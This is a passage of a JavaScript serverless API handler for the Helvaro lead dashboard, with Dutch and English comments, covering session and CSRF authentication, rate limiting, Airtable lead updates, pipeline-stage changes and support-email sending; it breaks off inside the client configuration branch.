const crypto = require('crypto');
const _gcal   = require('./_gcal');
const _afspraken = require('./_afspraken'); // afzeggen: rij + agenda + leadvlaggen
const _regio  = require('./_regio');      // land, tijdzone, munt en telefoon per klant
const _session = require('./_session');
const _revoke  = require('./_revocation');
const _clerk   = require('./_clerk'); // Clerk-sessies, achter CLERK_ENABLED // password-change -> session revocation // cookie-first session transport + CSRF   // per-client Google Calendar (optional, fail-soft)
const credits = require('./_credits'); // credit/usage accounting — see its file header
const _ai     = require('./_ai');      // AI-router: modelkeuze, fallback, verbruik
const { getPlanState } = require('./_plan'); // trial/plan-status interpretation — pure, no I/O
const images  = require('./_images'); // Phase 4 AI property images — see its file header
const _properties = require('./_properties'); // de panden zelf, niet hun beelden
const _ledger = require('./_ledger');         // creditgrootboek: elke beweging een regel
const _lang   = require('./_lang');   // language registry — see its file header
const _verify = require('./_verify'); // email-ownership verification — see its file header
const _leadsRead = require('./_leads-read'); // shared lead field map + mapper + stats, also used by Faro
const _command   = require('./_command');     // Command Center intelligence layer — pure, no I/O, no model

// Single-shot Airtable fetch. No retries on 429.
//
// Root-cause (2026-05-14): multiple dashboard tabs each polling every 90 s,
// with 2-retry atFetch, generated 4–5 simultaneous Airtable calls and kept
// Airtable permanently rate-limited in a self-reinforcing cycle.
//
// Fix: one attempt only for everything.  On 429 → return immediately →
// serve stale cache (polling) or surface error (PATCH) → wait the natural
// interval before trying again.  No rapid retries that extend the ban.
// Airtable-timeout. Zonder signal blijft een hangende call staan tot Vercel de
// hele functie afkapt op zijn maxDuration — 60s hier — en krijgt de gebruiker
// een verbroken verbinding in plaats van een nette fout. 10s is ruim: een
// normale Airtable-call is 200-400ms, dus alles daarboven is al kapot.
// AbortSignal.timeout is standaard vanaf Node 18, geen dependency nodig.
const AT_TIMEOUT_MS = 10_000;
async function atFetch(url, opts) {
  return fetch(url, { ...opts, signal: (opts && opts.signal) || AbortSignal.timeout(AT_TIMEOUT_MS) });
}

// Client config cache by API key. 30 min TTL
// Legacy (pre-session-token) keys still hit Airtable on a cold instance;
// longer TTL means the warm-instance path covers far more polls before
// needing to refresh, reducing Airtable noise that competes with auth.js.
const _clientCache = new Map();
const CLIENT_TTL   = 30 * 60 * 1000;

// Leads response cache by projectCode.
// On Airtable 429, serves the last-known-good response so the dashboard
// stays populated instead of showing an error.  We always try Airtable
// first; the cache is only used when Airtable refuses (429) or errors.
// MAX_STALE_MS caps how old the stale data can be. After 1 hour we'd
// rather show an empty state than leads from yesterday.
const _leadsCache = new Map();
const MAX_STALE_MS = 60 * 60 * 1000; // 1 hour
function getCachedLeads(code) {
  return _leadsCache.get(code) || null; // { payload, ts }. caller checks freshness
}
function setCachedLeads(code, payload) {
  _leadsCache.set(code, { payload, ts: Date.now() });
}
function getCachedClient(key) {
  const e = _clientCache.get(key);
  if (!e) return null;
  if (Date.now() - e.ts > CLIENT_TTL) { _clientCache.delete(key); return null; }
  return e.record;
}
function setCachedClient(key, record) {
  _clientCache.set(key, { record, ts: Date.now() });
}

// Rate limiter. 120 req / 60s per IP (allows normal polling, blocks hammering)
const _rl = new Map();
function isRateLimited(ip, max = 120, windowMs = 60_000) {
  const now  = Date.now();
  const hits = (_rl.get(ip) || []).filter(t => now - t < windowMs);
  hits.push(now);
  _rl.set(ip, hits);
  if (_rl.size > 2000) { for (const [k, v] of _rl) if (!v.some(t => now - t < windowMs)) _rl.delete(k); }
  return hits.length > max;
}

// Per-tenant daily quota for the test-message mode (see below). Keyed by
// `${projectCode}:${YYYY-MM-DD}` so the counter naturally resets every day
// with no separate cleanup job needed — same day-bucket idea as the rest of
// this file's in-memory maps. Protects the shared platform WhatsApp number:
// without this, one client hammering test-message (their only backstop was
// the IP-based rate limiter) risks the shared number getting rate-limited or
// banned by Meta for every client on the platform.
const _testMsgCounts = new Map();
const TEST_MSG_DAILY_LIMIT = 10;
function isTestMessageQuotaExceeded(projectCode) {
  const day  = new Date().toISOString().slice(0, 10);
  const key  = `${projectCode}:${day}`;
  const next = (_testMsgCounts.get(key) || 0) + 1;
  _testMsgCounts.set(key, next);
  if (_testMsgCounts.size > 2000) {
    for (const k of _testMsgCounts.keys()) if (!k.endsWith(':' + day)) _testMsgCounts.delete(k);
  }
  return next > TEST_MSG_DAILY_LIMIT;
}

function safeEqual(a, b) {
  try {
    const ba = Buffer.from(String(a));
    const bb = Buffer.from(String(b));
    if (ba.length !== bb.length) return false;
    return crypto.timingSafeEqual(ba, bb);
  } catch { return false; }
}

function isAdminToken(provided, adminKey) {
  if (!adminKey || !provided) return false;
  const expected = crypto.createHmac('sha256', adminKey).update('helvaro-admin-v1').digest('hex');
  return safeEqual(provided, expected);
}

// ── Session token verification ─────────────────────────────────────────────────
// Tokens are signed by auth.js; verifying locally saves one Airtable call per
// request for every client. No env vars needed, works at any scale.
// Fail closed: never verify tokens with a known constant (see auth.js signingBase).
// A missing secret must reject sessions, not accept forged ones for any tenant.
function sessionSecret() {
  const base = process.env.SESSION_SECRET || process.env.ADMIN_KEY;
  if (!base) throw new Error('SESSION_SECRET (or ADMIN_KEY) is not configured — refusing to verify tokens with a default secret');
  return crypto.createHmac('sha256', base).update('helvaro-session-v1').digest('hex');
}
function verifySession(token) {
  if (typeof token !== 'string' || !token.startsWith('hvs1.')) return null;
  const parts = token.split('.');
  if (parts.length !== 3) return null;
  const [, payload, sig] = parts;
  if (!payload || !sig) return null;
  // sessionSecret() throwing here means the environment is misconfigured
  // (no SESSION_SECRET/ADMIN_KEY) — log it distinctly so it surfaces in
  // ops rather than looking like routine invalid-key traffic. Every request
  // still falls through to Path B (legacy key) and gets a normal 401;
  // nothing crashes.
  let secret;
  try {
    secret = sessionSecret();
  } catch (err) {
    console.error('[leads] session verification unavailable:', err.message);
    return null;
  }
  try {
    const expected = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
    const a = Buffer.from(sig,      'base64url');
    const b = Buffer.from(expected, 'base64url');
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
    const data = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    // Fail closed: a token missing exp entirely must be rejected, not treated
    // as never-expiring. Every token minted by auth.js's signSession() always
    // sets exp, so a missing/invalid exp means a malformed or hand-crafted token.
    if (typeof data.exp !== 'number' || !isFinite(data.exp) || Date.now() > data.exp) return null;
    return data;
  } catch { return null; }
}

module.exports = async function handler(req, res) {
  /* Leaddata mag niet in een gedeelde cache belanden.
     Zonder een eigen header zet Vercel hier zijn standaard neer:
     "public, max-age=0, must-revalidate". Dat must-revalidate voorkomt dat er
     verouderde data geserveerd wordt, maar "public" staat wel toe dat een
     gedeelde cache -- een CDN, een bedrijfsproxy -- het antwoord OPSLAAT. En
     dit antwoord bevat namen en telefoonnummers van leads.

     Het was ook zichtbaar: een tweede verzoek zonder cookies kreeg in de
     browser een 200 met leads uit de cache terug, terwijl dezelfde aanvraag
     buiten de browser netjes 401 gaf.

     no-store, niet no-cache: no-cache staat opslaan nog steeds toe zolang er
     maar gerevalideerd wordt, en op een gedeelde computer is de kopie op schijf
     nu juist het probleem. api/dashboard.js zet zelf al 'private, no-cache'.
     Een specifieke route mag dit hieronder overschrijven -- zie de
     'private, max-age=120' verderop, die bewust wel kort cachet. */
  res.setHeader('Cache-Control', 'private, no-store');
  res.setHeader('Access-Control-Allow-Origin', 'https://app.helvaro.pro');
  res.setHeader('Access-Control-Allow-Methods', 'GET, PATCH, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // Google Calendar OAuth/connection is folded into this function to stay under
  // Vercel's serverless-function limit (no separate api/gcal.js — that caused a
  // deploy failure before, see api/_gcal.js's header comment). The public path
  // /api/gcal is rewritten here with __gcal=1 (see vercel.json), so the
  // registered Google redirect URI (/api/gcal?action=callback) never has to
  // change. Handle it before the leads auth flow / rate limiter — it has its
  // own auth (signed session or signed OAuth state) and must never be blocked
  // by IP rate limiting meant for the leads API.
  if (req.query && req.query.__gcal === '1') return handleGcal(req, res);

  // Vercel sets x-vercel-forwarded-for itself from the real edge connection and
  // strips/overwrites any client-supplied value, unlike x-forwarded-for, which
  // a client can set directly to spoof the rate-limit key. Fall back to
  // x-forwarded-for only when x-vercel-forwarded-for is absent (e.g. local dev
  // without the Vercel edge in front).
  const ip = req.headers['x-vercel-forwarded-for']?.split(',')[0]?.trim()
          || req.headers['x-forwarded-for']?.split(',')[0]?.trim()
          || 'unknown';
  if (isRateLimited(ip)) return res.status(429).json({ error: 'Te veel verzoeken. Probeer later opnieuw.' });

  const AIRTABLE_TOKEN = process.env.API_AIRTABLE;
  const BASE_ID        = process.env.BASE_AIRTABLE;
  const LEADS_TABLE    = 'tbliukTnDAbEDcZmt';
  const CLIENTS_TABLE  = 'tblPidTrwGRzRt4LZ';

  // ── Auth ────────────────────────────────────────────────────────────────────
  let projectCode = '', clientName = '', calendlyLink = '', isAdmin = false;

  // Path 0: Clerk. Only consulted when CLERK_ENABLED=1 (see api/_clerk.js);
  // otherwise it returns null immediately and nothing below behaves any
  // differently. It runs BEFORE the token check on purpose: a Clerk request
  // carries only Clerk's own __session cookie, so requiring the legacy token
  // first would 401 every Clerk user before they ever got here.
  const clerkSession = await _clerk.verifySession(req);

  /* ── MODE: support. Een bericht aan ons, verstuurd vanuit de app ───────────
     Hier stond een mailto. Die opent het mailprogramma van het apparaat, en op
     de privélaptop waar dit dashboard vaak gelezen wordt is dat niet het
     zakelijke adres — of staat er niets ingesteld en gebeurt er zichtbaar
     niets. Voor een gewone vraag is dat vervelend; voor "mijn account is nog
     niet ingericht" of "koppel mijn WhatsApp" is het erger, want dat zijn
     precies de momenten waarop iemand vastzit en niet verder kan. Een adres
     laten kopiëren lost dat ook niet op: het verplaatst het werk alleen naar de
     klant.

     Dus versturen we hem zelf, met de afzender als reply-to. De klant blijft in
     de app en ziet of het gelukt is.

     Dit staat bewust VOOR de TENANT_PENDING-403 hieronder: iemand die wacht tot
     zijn account ingericht wordt is degene die deze knop het hardst nodig heeft.
     Zijn Clerk-login is geldig; alleen zijn tenant ontbreekt nog.

     De identiteit komt uit de sessie, nooit uit de body — anders is dit een
     open relay waarmee iedereen namens een ander kan mailen. */
  {
    const b = _session.safeBody(req);
    if (req.method === 'POST' && b && b.mode === 'support') {
      const sessieToken = _session.readToken(req);
      const eigenSessie = sessieToken ? _session.verifySignedSession(sessieToken) : null;
      // Het veld heet 'em' in beide sessievormen (zie api/_clerk.js en de
      // userData in api/auth.js), niet 'email'.
      const afzender =
        (clerkSession && clerkSession.em) ||
        (eigenSessie  && eigenSessie.em)  || '';
      const tenant =
        (clerkSession && clerkSession.projectCode) ||
        (eigenSessie  && eigenSessie.projectCode)  || '';
      const naam =
        (clerkSession && clerkSession.clientName) ||
        (eigenSessie  && eigenSessie.clientName)  || '';

      // Onbekend = geen mail. Alleen ingelogde mensen (ook de wachtenden).
      if (!clerkSession && !eigenSessie) {
        return res.status(401).json({ error: 'Log in om ons een bericht te sturen.' });
      }
      if (!_session.csrfOk(req)) {
        return res.status(403).json({ error: 'Ongeldig of ontbrekend CSRF-token' });
      }

      const bericht  = String(b.bericht  || '').trim().slice(0, 4000);
      const onderwerp = String(b.onderwerp || '').trim().slice(0, 120) || 'Vraag via het dashboard';
      if (bericht.length < 5) {
        return res.status(400).json({ error: 'Schrijf even kort waar het over gaat.' });
      }

      /* Vijf per uur per afzender. Genoeg voor iemand die vastzit en het nog
         eens probeert, te weinig om ons postvak om te leggen. Faalt open: een
         storing in de begrenzer mag een supportvraag niet tegenhouden. */
      try {
        const _rl = require('./_ratelimit');
        const sleutel = afzender || tenant || (req.headers['x-forwarded-for'] || 'onbekend');
        const r = await _rl.hit('support', String(sleutel), 5, 60 * 60 * 1000);
        if (r && r.limited) {
          return res.status(429).json({ error: 'Je hebt net al een paar berichten gestuurd. Probeer het over een uur nog eens — of bel ons.' });
        }
      } catch (e) { /* begrenzer stuk: laat de vraag door */ }

      const esc = (v) => String(v == null ? '' : v)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

      const { sendMail } = require('./_mailer');
      const verstuurd = await sendMail({
        to:      process.env.SUPPORT_EMAIL || 'hello@helvaro.pro',
        subject: `[Dashboard] ${onderwerp}` + (naam ? ` — ${naam}` : ''),
        // Reply-to op de klant, zodat "beantwoorden" gewoon werkt.
        replyTo: afzender || undefined,
        html:
          `<p><strong>${esc(onderwerp)}</strong></p>` +
          `<p style="white-space:pre-wrap">${esc(bericht)}</p>` +
          `<hr><p style="color:#666;font-size:12px">` +
          `Van: ${esc(afzender || 'onbekend')}<br>` +
          `Kantoor: ${esc(naam || '—')}<br>` +
          `Projectcode: ${esc(tenant || '— (account nog niet ingericht)')}<br>` +
          `Verstuurd vanuit het dashboard.</p>`,
      });

      /* sendMail() gooit nooit en geeft een resultaat terug. Lukt het niet, dan
         zeggen we dat eerlijk en geven we het adres alsnog mee, zodat de klant
         niet met lege handen staat. */
      if (!verstuurd || verstuurd.ok === false) {
        return res.status(502).json({
          ok: false,
          error: 'Versturen lukte niet.',
          fallbackEmail: process.env.SUPPORT_EMAIL || 'hello@helvaro.pro',
        });
      }
      return res.status(200).json({ ok: true });
    }
  }

  if (clerkSession && clerkSession.pending) {
    // Valid Clerk login, but nobody has assigned this account to a client yet.
    // A distinct code so the dashboard can explain the wait instead of showing
    // a login failure to someone whose credentials were fine.
    return res.status(403).json({ error: 'Je account wordt nog ingericht.', code: 'TENANT_PENDING' });
  }
  if (clerkSession) {
    projectCode  = clerkSession.projectCode;
    clientName   = clerkSession.clientName;
    calendlyLink = clerkSession.calendlyLink;
    // _clerk.verifySession already refuses a session without a projectCode, so
    // reaching here means the tenant is known. Belt and braces anyway: an empty
    // projectCode reads as "admin, show everything" further down.
    if (!projectCode) return res.status(401).json({ error: 'Sessie mist een projectcode' });
    if (!_session.csrfOk(req)) return res.status(403).json({ error: 'Ongeldig of ontbrekend CSRF-token' });
  }

  // Accept up to 2 KB to accommodate signed session tokens (~400 chars)
  // Cookie first, x-api-key as fallback — see api/_session.js.
  const raw = projectCode ? '' : _session.readToken(req);
  if (!projectCode) {
    if (!raw) return res.status(401).json({ error: 'API key ontbreekt' });
    // Only cookie-authenticated writes are checked; header auth cannot be
    // forged cross-origin, so it is exempt.
    if (!_session.csrfOk(req)) return res.status(403).json({ error: 'Ongeldig of ontbrekend CSRF-token' });
  }

  // Path A: signed session token. Verify locally, zero Airtable calls
  const session = projectCode ? null : verifySession(raw);
  if (session) {
    // Signature and expiry are not enough on their own: a token stays valid
    // for its full 7 days even after the password behind it changed. This
    // check ends sessions minted under an older password. Cached ~60s, and
    // fails open on an Airtable outage — see api/_revocation.js.
    if (await _revoke.isRevoked(session)) {
      return res.status(401).json({ error: 'Sessie verlopen. Log opnieuw in.' });
    }
    projectCode  = session.projectCode  || '';
    clientName   = session.clientName   || '';
    calendlyLink = session.calendlyLink || '';
  } else {
    // Path B: legacy API key (admin derived token or old sessions before this deploy)
    if (!/^[A-Za-z0-9\-_]{8,100}$/.test(raw)) {
      return res.status(401).json({ error: 'Ongeldige API key' });
    }

    // Admin token. Timing-safe check against the derived token (not the raw key)
    if (isAdminToken(raw, process.env.ADMIN_KEY)) {
      // GET-only short-circuit: an admin session has no real client/lead data
      // of its own, so a GET (dashboard load) returns an empty-but-valid
      // payload. PATCH/POST must NOT silently no-op here — a PATCH (save
      // notes) or POST (send message) authenticated with an admin token used
      // to hit this same unconditional return, so the caller believed it
      // succeeded while nothing happened. Surface a clear error instead.
      if (req.method === 'GET') {
        return res.status(200).json({
          leads: [],
          stats: { total: 0, qualified: 0, booked: 0, conversionRate: 0, thisMonth: 0, avgResponseTime: 0 },
          client: { naam: 'Admin', calendly: '' }
        });
      }
      // Compliance fix (COMPLIANCE-AUDIT.md section 1.2, ported from the VPS
      // backend's server/routes/leads.js): the ONE exception to "admin-token
      // never touches lead data" above — admin-authenticated lead erasure/
      // export, so a data-subject-rights request (right to erasure/access,
      // GDPR Arts. 15-20, DPA clause 7.3) can be fulfilled through a scoped,
      // logged API call instead of an ad-hoc manual Airtable edit. Every
      // other POST/PATCH mode stays blocked below — admin has no per-tenant
      // identity to safely scope any OTHER write to.
      let peekBody = req.body;
      if (typeof peekBody === 'string') { try { peekBody = JSON.parse(peekBody); } catch { peekBody = {}; } }
      if (req.method === 'POST' && peekBody && (peekBody.mode === 'lead-delete' || peekBody.mode === 'lead-export')) {
        isAdmin = true;
      } else {
        return res.status(400).json({ error: 'Admin-token ondersteunt deze bewerking niet' });
      }
    }

    // Airtable Clients table lookup (with 5-min in-memory cache as last resort)
    try {
      let client = getCachedClient(raw);
      if (!client) {
        const formula = encodeURIComponent(`{API Key}="${escapeFormula(raw)}"`);
        const cRes    = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (cRes.status === 429) {
          return res.status(503).json({ error: 'Systeem is druk. Probeer over 30 seconden opnieuw.' });
        }
        const cData = await cRes.json();
        if (!cData.records || cData.records.length === 0) {
          return res.status(401).json({ error: 'Ongeldige API key' });
        }
        client = cData.records[0];
        setCachedClient(raw, client);
      }
      projectCode  = client.fields['fldN4dL0bGgfBOXwM'] || client.fields['Project Code']  || '';
      clientName   = client.fields['fldAnB848Sr5jl6dq'] || client.fields['Client Name']   || '';
      calendlyLink = client.fields['fldNEj1ysRgINOOtr'] || client.fields['Calendly Link'] || '';
    } catch (err) {
      console.error('Leads auth error:', err.message);
      return res.status(500).json({ error: 'Database fout. Probeer later opnieuw.' });
    }
  }

  // ── PATCH. Save notes ──────────────────────────────────────────────────────
  if (req.method === 'PATCH') {
    try {
      const pqs     = (req.url || '').split('?')[1] || '';
      const pParams = new URLSearchParams(pqs);
      let recordId  = pParams.get('id') || '';

      // Fallback: last URL segment
      if (!recordId) {
        const p    = (req.url || '').split('?')[0].split('/').filter(Boolean);
        recordId   = p[p.length - 1] || '';
      }

      // Strict Airtable record ID format: rec + 14 alphanumeric chars
      if (!/^rec[A-Za-z0-9]{14}$/.test(recordId)) {
        return res.status(400).json({ error: 'Ongeldig record ID' });
      }

      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
      if (!body || typeof body !== 'object') body = {};

      // SECURITY: verify the lead belongs to the authenticated client BEFORE
      // building/mutating any fields. Without this, anyone with a valid
      // session token could PATCH any lead in the system as long as they
      // knew/guessed the record ID. Admin tokens bypass (already
      // short-circuited earlier with empty leads). Done up front (rather
      // than after building `fields`) because the pipeline-stage branch
      // below needs the lead's current field values too, so we fetch once
      // and reuse the result for both.
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      let ownData;
      try {
        const ownCheck = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!ownCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        ownData = await ownCheck.json();
        const ownProject = ownData.fields?.['fldSmczuyUJd26HLe'] || ownData.fields?.['Project Code'] || '';
        if (ownProject !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang tot deze lead' });
        }
      } catch (err) {
        console.error('[leads PATCH] ownership check failed:', err.message);
        return res.status(500).json({ error: 'Server fout' });
      }

      const fields = {};
      if (body.notities !== undefined) fields['fldoLRI5W12ThTls7'] = String(body.notities).slice(0, 8000);
      if (body.status   !== undefined) {
        const allowed = ['new', 'in_progress', 'completed', 'verloren'];
        if (allowed.includes(body.status)) fields['fld8mkrEWcyq7mUip'] = body.status;
      }
      if (body.dealWaarde   !== undefined) fields['fldv7qOYvCN1xJfiR'] = String(body.dealWaarde).slice(0, 200);
      if (body.verliesReden !== undefined) {
        // Allowlist matches the exact <select> options in dashboard.js (lines 10020-10027)
        // Empty string clears the field; unknown values are silently ignored (defense in depth).
        const allowedRedenen = ['', 'Prijs te hoog', 'Geen timing', 'Concurrent gekozen', 'Geen interesse', 'Geen reactie', 'Andere reden'];
        const reden = String(body.verliesReden);
        if (allowedRedenen.includes(reden)) {
          fields['fld3NhSENma0okbT7'] = reden;
        }
        // Unknown values are silently dropped. The dashboard UI only sends known values;
        // an attacker injecting free text gets their payload ignored, which is exactly
        // what we want. Returning a 400 here would leak which values ARE valid.
      }

      // ── Pipeline stage transition (Kanban drag-and-drop) ──────────────────────
      // Dedicated field instead of overloading `status`: `status` (fld8mkrEWcyq7mUip)
      // drives the WhatsApp nurture cron (cron-followup.js) via literal
      // 'new'/'in_progress'/'completed'/'verloren' values that mean "conversation
      // state", NOT "sales pipeline column" — those are two different concepts
      // that used to be conflated, which is what broke drag-and-drop.
      //
      // The pipeline board (renderPipeline() in dashboard.js) computes each
      // column from three booleans, plus — for the "lost" column only — status.
      // Filters (order-independent but overlapping, so the write-set per
      // target must actively clear the OTHER columns' conditions too):
      //   new        !qualified && !afspraakGeboekt && !opgepikt && !(qualified===false && status==='completed')
      //   qualified  qualified===true && !afspraakGeboekt && !opgepikt
      //   afspraak   afspraakGeboekt===true && !opgepikt
      //   won        opgepikt===true
      //   lost       qualified===false && status==='completed'
      if (body.pipelineStage !== undefined) {
        const PIPELINE_STAGES = ['new', 'qualified', 'afspraak', 'won', 'lost'];
        if (!PIPELINE_STAGES.includes(body.pipelineStage)) {
          return res.status(400).json({ error: 'Ongeldige pipeline fase' });
        }
        const F_QUALIFIED = 'fld0hAZJ5wgaXrNTn';
        const F_AFSPRAAK  = 'fldyIGNetqcSEkoaK';
        const F_OPGEPIKT  = 'fld86JQHB6dbuutA7';
        const F_STATUS    = 'fld8mkrEWcyq7mUip';

        /* status:'verloren' -- de markering die de makelaar zelf in het paneel
           zet -- telt sinds kort ook als "verloren" op het bord. Dat was nodig
           (die markering deed op het bord zichtbaar niets), maar het maakt een
           tweede uitweg noodzakelijk: sleep je zo'n lead terug naar een andere
           kolom, dan blijft die status staan en springt het kaartje terug.

           Elke fase BEHALVE lost zet de status daarom op 'in_progress'. Niet op
           'new', om dezelfde reden als in de new-tak hieronder: 'new' zet de
           opvolgcron opnieuw aan voor een lead die niet vers is.

           Alleen als hij er ook echt op stond: de huidige rij is hier al
           opgehaald (ownData), dus dat kost niets. Een lead die gewoon op
           'in_progress' of 'new' staat wordt niet aangeraakt -- die status
           stuurt de opvolgcron, en die zonder reden verzetten is precies hoe je
           een opvolging kwijtraakt. */
        if (body.pipelineStage !== 'lost'
            && String((ownData.fields || {})[F_STATUS] || '').toLowerCase() === 'verloren') {
          fields[F_STATUS] = 'in_progress';
        }

        switch (body.pipelineStage) {
          case 'qualified':
            // Must clear afspraak/opgepikt or it'd also satisfy those
            // columns' filters and render twice.
            fields[F_QUALIFIED] = true;
            fields[F_AFSPRAAK]  = false;
            fields[F_OPGEPIKT]  = false;
            break;
          case 'afspraak':
            // A booked appointment implies qualification; clearing opgepikt
            // keeps it out of the "won" column.
            fields[F_QUALIFIED] = true;
            fields[F_AFSPRAAK]  = true;
            fields[F_OPGEPIKT]  = false;
            break;
          case 'won':
            // The "won" filter only checks opgepikt, but we set all three so
            // the funnel booleans — and the dashboard's "qualified"/"booked"
            // stats, which read these same fields — stay consistent with a
            // closed deal instead of silently understating them.
            fields[F_QUALIFIED] = true;
            fields[F_AFSPRAAK]  = true;
            fields[F_OPGEPIKT]  = true;
            break;
          case 'lost':
            // Must ALSO clear afspraakGeboekt/opgepikt: a lead dragged here
            // from Afspraak or Won would otherwise still satisfy those
            // columns' filters and render in two places at once.
            fields[F_QUALIFIED] = false;
            fields[F_AFSPRAAK]  = false;
            fields[F_OPGEPIKT]  = false;
            fields[F_STATUS]    = 'completed';
            break;
          case 'new':
          default: {
            fields[F_QUALIFIED] = false;
            fields[F_AFSPRAAK]  = false;
            fields[F_OPGEPIKT]  = false;
            // The "new" filter excludes qualified===false && status==='completed'
            // — exactly the combination the "lost" column writes above. A lead
            // dragged back from Lost still has status:'completed' at this
            // point, so without correcting it here the card would silently
            // keep rendering under Lost instead of moving to New.
            // Bump to 'in_progress' rather than literal 'new': 'new' has
            // cron-followup.js meaning ("un-contacted, fresh conversation")
            // and would re-arm the 24h/7d nurture follow-up and the
            // stuck-at-new sweep for a lead that isn't actually fresh — it's
            // just being manually re-opened in the pipeline. Only touch
            // status when it's actually 'completed' OR 'verloren'; leave it
            // alone otherwise so a lead already sitting in New isn't perturbed.
            // 'verloren' staat er sinds die markering ook als lost telt: zonder
            // dit springt een handmatig-verloren lead terug naar Verloren zodra
            // je hem naar Nieuw sleept.
            const curStatus = ownData.fields?.[F_STATUS] || '';
            if (curStatus === 'completed') fields[F_STATUS] = 'in_progress';
            break;
          }
        }
      }

      if (Object.keys(fields).length === 0) return res.status(400).json({ error: 'Geen velden om bij te werken' });

      /* typecast:true, en dat is hier geen luxe maar een reparatie.
         `Conversation State` is een singleSelect met alleen new/in_progress/
         completed. De dashboardstatus "Verloren" schrijft `verloren`, en
         Airtable weigert bij een onbekende keuze de HELE patch -- dus ook de
         notities, de dealwaarde en de verliesreden die in dezelfde aanroep
         meegingen. De makelaar zag "Opslaan mislukt" en raakte alles kwijt wat
         hij net had ingevuld.

         Met typecast maakt Airtable de ontbrekende keuze zelf aan. De waarden
         staan hierboven al op een allowlist, dus er kan niets anders binnenkomen
         dan wat wij zelf toestaan -- typecast is hier geen open deur.

         Dezelfde vlag staat al op drie andere plekken in dit bestand, om
         precies dezelfde reden. */
      const pRes  = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        {
          method:  'PATCH',
          headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ fields, typecast: true })
        }
      );
      const pData = await pRes.json();
      if (!pRes.ok) {
        /* De reden meelezen in het log. "Airtable PATCH error: 422" zegt niet
           WELK veld weigerde, en dat is precies wat je nodig hebt -- deze fout
           heeft maandenlang de verloren-status stilgelegd zonder dat er ergens
           stond waarom. Naar de klant blijft het een nette zin. */
        const detail = await pRes.text().catch(() => '');
        console.error(`[leads] PATCH ${recordId} mislukt (HTTP ${pRes.status}):`, detail.slice(0, 300));
        return res.status(500).json({ error: 'Opslaan mislukt. Probeer later opnieuw.' });
      }

      // ── Deal-closed email notification ──────────────────────────────────────
      if (body.dealWaarde) {
        const leadName = pData.fields?.['fldbk0LVNckOU0bqA'] || pData.fields?.['Name'] || '(onbekend)';
        sendResendEmail({
          // escHtml vervangt & < > " en laat \r\n staan — prima voor de HTML
          // hieronder, waardeloos voor een mailheader. De naam komt uit het
          // publieke formulier, dus stuurtekens er hier expliciet uit.
          subject: `Deal gesloten - ${String(leadName).replace(/[\x00-\x1F\x7F]/g, '').replace(/\s+/g, ' ').trim().slice(0, 120)} (${String(body.dealWaarde).replace(/[\x00-\x1F\x7F]/g, '').slice(0, 40)})`,
          html: `
            <div style="font-family:sans-serif;max-width:480px;margin:auto">
              <h2 style="color:#16a34a">Deal gesloten</h2>
              <table style="width:100%;border-collapse:collapse">
                <tr><td style="padding:8px;color:#666">Lead</td><td style="padding:8px;font-weight:600">${escHtml(leadName)}</td></tr>
                <tr><td style="padding:8px;color:#666">Waarde</td><td style="padding:8px;font-weight:700;color:#16a34a">${escHtml(body.dealWaarde)}</td></tr>
                <tr><td style="padding:8px;color:#666">Client</td><td style="padding:8px">${escHtml(clientName)}</td></tr>
              </table>
              <a href="https://app.helvaro.pro/dashboard" style="display:inline-block;margin-top:16px;padding:10px 20px;background:#16a34a;color:#fff;border-radius:8px;text-decoration:none">Open Dashboard</a>
            </div>`
        }).catch(() => {});
      }

      return res.status(200).json(pData);
    } catch (err) {
      console.error('PATCH error:', err.message);
      return res.status(500).json({ error: 'Serverfout. Probeer later opnieuw.' });
    }
  }

  // ── POST handlers ──────────────────────────────────────────────────────────
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    if (!body || typeof body !== 'object') body = {};

    // ── A. Config-get / config-save (AI Persona settings page) ───────────────
    // Authenticated by the same session/api-key flow; only allows the client
    // to read/write THEIR own Klanten record. Whitelisted fields only.
    if (body.mode === 'config-get' || body.mode === 'config-save') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        // Look up the client's Klanten record by Project Code (field ID fldN4dL0bGgfBOXwM)
        const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
        const cRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!cRes.ok) return res.status(500).json({ error: 'Klant niet gevonden' });
        const cData = await cRes.json();
        const rec   = (cData.records || [])[0];
        if (!rec) return res.status(404).json({ error: 'Klantrecord niet gevonden' });

        // ── GET current config ──
        if (body.mode === 'config-get') {
          return res.status(200).json({
            aiName:         rec.fields['fldRvoe1JMPOtPWC7'] || rec.fields['AI Name']             || '',
            autoReplyTpl:   rec.fields['fldOGdVq6T54xEo6W'] || rec.fields['Auto-Reply Template'] || '',
            aiInstructions: rec.fields['fld1lqHctRbqFGQf5'] || rec.fields['AI Instructions']     || '',
            website:        rec.fields['fldzBclLhryWQ1veO'] || rec.fields['Website']             || '',
            address:        rec.fields['fldTvMSdTZOyNgWod'] || rec.fields['Adres']               || '',
            sector:         rec.fields['fld0BsPnDbBOkTHzr'] || rec.fields['Niche']               || '',
